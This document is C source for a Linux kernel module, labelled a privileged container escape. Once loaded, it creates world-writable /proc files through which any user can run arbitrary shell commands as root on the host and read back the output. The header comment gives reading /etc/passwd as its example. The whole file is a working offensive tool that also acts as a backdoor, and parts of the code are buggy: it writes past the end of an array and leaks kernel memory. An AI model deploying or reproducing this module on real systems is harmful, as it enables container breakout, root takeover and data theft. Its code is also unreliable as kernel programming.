/*
 * Linux Privileged Container Escape
 *
 * After building, load with 'insmod escape.ko'
 * Then 'echo "cat /etc/passwd" > /proc/escape' will execute
 * 'cat /etc/passwd' as root and send the output to /proc/output
 * Read /proc/output just like any normal file
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/proc_fs.h>
#include <linux/umh.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Xcellerator");
MODULE_DESCRIPTION("Privileged Container Escape");
MODULE_VERSION("0.01");

struct proc_dir_entry *proc_file_entry_escape;
struct proc_dir_entry *proc_file_entry_output;

char *argv[2];
char *envp[3];

char *cmd_output = NULL;
int cmd_output_len = 0;

/*
 * Execute a process in userspace
 */
int handle_cmd(void)
{
    int ret;

    /*
     * If, for some reason, we get called before a command is set, just return
     */
    if(argv[0] == NULL)
        return 0;

    /*
     * Execute the command stored in argv
     */
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return ret;
}

/*
 * Grab the string written to /proc/escape, parse it, execute it in userland,
 * redirecting output to /proc/output for saving
 */
ssize_t escape_write(struct file *file, const char *buf, size_t len, loff_t *offset)
{
    int ret;
    char *kbuf = NULL;
    long error;
    char *suffix = " > /proc/output";

    /*
     * Allocate a kernel buffer to read the command input into
     */
    kbuf = kzalloc(len, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, len-1);

    if(error)
        return -1;

    /*
     * call_usermodehelper() requires an array of arguments (argv)
     * We're executing /bin/sh -c 'COMMAND > /proc/output'
     */
    argv[0] = "/bin/sh";
    argv[1] = "-c";
    argv[2] = kzalloc(len+16, GFP_KERNEL);

    strncpy(argv[2], kbuf, len-1);
    strcat(argv[2], suffix);

    /*
     * Execute the command stored in argv
     */
    printk(KERN_DEBUG "escape: executing %s %s %s\n", argv[0], argv[1], argv[2]);
    ret = handle_cmd();

    /*
     * Cleanup and return
     */
    kfree(kbuf);
    return len;
}

/*
 * Take a buffer from userspace and copy it into the kernel buffer cmd_output
 */
ssize_t output_write(struct file *file, const char *buf, size_t len, loff_t *offset)
{
    long error;

    /*
     * If cmd_output is already allocated, free it so we can reallocate it with a new size
     */
    if(cmd_output_len != 0)
        kfree(cmd_output);

    /*
     * Allocate cmd_output with size len (from user)
     */
    cmd_output = kzalloc(len, GFP_KERNEL);

    /*
     * Copy buffer from userspace into cmd_output
     */
    error = copy_from_user(cmd_output, buf, len);
    if(error)
        return -1;

    /*
     * Update cmd_output_len to the size of the buffer from userspace
     */
    cmd_output_len = len;

    return len;
}

/*
 * Copy the cmd_output buffer into the buf provided by userspace
 */
ssize_t output_read(struct file *file, char *buf, size_t len, loff_t *offset)
{
    int ret;
    char *kbuf = NULL;
    long error;
    static int finished = 0;

    /*
     * Allocate a new kernel buffer and copy into our new kernel buffer
     * so we don't touch cmd_output unnecessarily
     */
    kbuf = kzalloc(cmd_output_len, GFP_KERNEL);
    strncpy(kbuf, cmd_output, cmd_output_len);

    /*
     * Copy the kernel buffer back to userspace
     * If we're done, then we return 0 to indicate the userland
     * process to stop reading.
     */
    if ( finished )
    {
        /*
         * No more bytes to return, so tell userland we're done
         * by returning 0
         */
        finished = 0;
        ret = 0;
        goto out;
    }
    else
    {
        /*
         * Copy the kernel buffer back to userspace and return the length
         */
        finished = 1;
        error = copy_to_user(buf, kbuf, cmd_output_len);
        if(error)
            return -1;
        ret = cmd_output_len;
        goto out;
    }

    /*
     * All done - free the kernel buffer and return
     */
out:
    kfree(kbuf);
    return ret;
}

/*
 * structs for the 2 procfs files we need
 * In kernel 5.6+, file_operations is replaced by proc_ops
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
// proc_ops version
static const struct proc_ops proc_file_fops_escape = {
    .proc_write = escape_write,
};

static const struct proc_ops proc_file_fops_output = {
    .proc_write = output_write,
    .proc_read = output_read,
};
#else
// file_operations version
static const struct file_operations proc_file_fops_escape = {
    .owner = THIS_MODULE,
    .write = escape_write,
};

static const struct file_operations proc_file_fops_output = {
    .owner = THIS_MODULE,
    .read = output_read,
    .write = output_write,
};
#endif

/*
 * LKM init function
 */
static int __init escape_init(void)
{
    printk(KERN_INFO "escape: loaded\n");
    
    /*
     * create the proc entries
     */
    proc_file_entry_escape = proc_create("escape", 0666, NULL, &proc_file_fops_escape);
    proc_file_entry_output = proc_create("output", 0666, NULL, &proc_file_fops_output);

    /*
     * check for failures
     */
    if( (proc_file_entry_escape == NULL) || (proc_file_entry_output == NULL) )
        return -ENOMEM;

    return 0;
}

/*
 * LKM exit function
 */
static void __exit escape_exit(void)
{
    /*
     * Free the cmd_output buffer and delete the proc entries
     */
    kfree(cmd_output);
    remove_proc_entry("escape", NULL);
    remove_proc_entry("output", NULL);
    printk(KERN_INFO "escape: unloaded\n");
}

module_init(escape_init);
module_exit(escape_exit);
